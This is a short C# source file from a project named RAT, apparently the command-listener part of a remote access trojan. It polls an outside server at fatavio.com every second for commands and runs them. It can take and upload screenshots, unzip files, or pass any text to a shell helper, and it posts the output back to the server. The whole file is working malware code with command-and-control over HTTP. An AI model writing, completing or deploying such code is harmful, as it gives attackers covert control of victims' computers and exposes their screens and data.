using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.ComponentModel;
using System.Threading;
using ICSharpCode.SharpZipLib;
using ICSharpCode.SharpZipLib.Zip;

namespace RAT
{
    class CommandListener
    {
        public CommandListener()
        {
            _Thread.DoWork += new DoWorkEventHandler(Listen);
            _Thread.RunWorkerAsync();
        }

        private BackgroundWorker _Thread = new BackgroundWorker();
        private string _BaseURL = "http://fatavio.com/rat/";

        public void Listen(object sender, EventArgs e)
        {
            while (true)
            {
                CMD _CMD = new CMD();
                string r = Http.Get(_BaseURL + "get.php");
                if (r != "")
                {
                    string id = r.Substring(0, r.IndexOf(":"));
                    string command = r.Substring(r.IndexOf(':') + 1);
                    string response;
                    switch (command.Split(' ')[0])
                    {
                        case "screenshot":
                            Screenshot ss = new Screenshot();
                            ss.Upload();
                            response = ss.FormatResponse();
                            break;
                        case "unzip":
                            string file = "";
                            try { file = command.Split(' ')[1]; }
                            catch { }
                            Zip.Unzip(file);
                            response = ">>" + command + "\n\nCompleted\n\n";
                            break;
                        default:
                            response = _CMD.Run(command);
                            break;
                    }
                    string err = Http.Post(_BaseURL + "response.php", "id=" + id + "&response=" + response);
                }
                Thread.Sleep(1000);
            }
        }

        private void Check()
        {

        }
    }
}
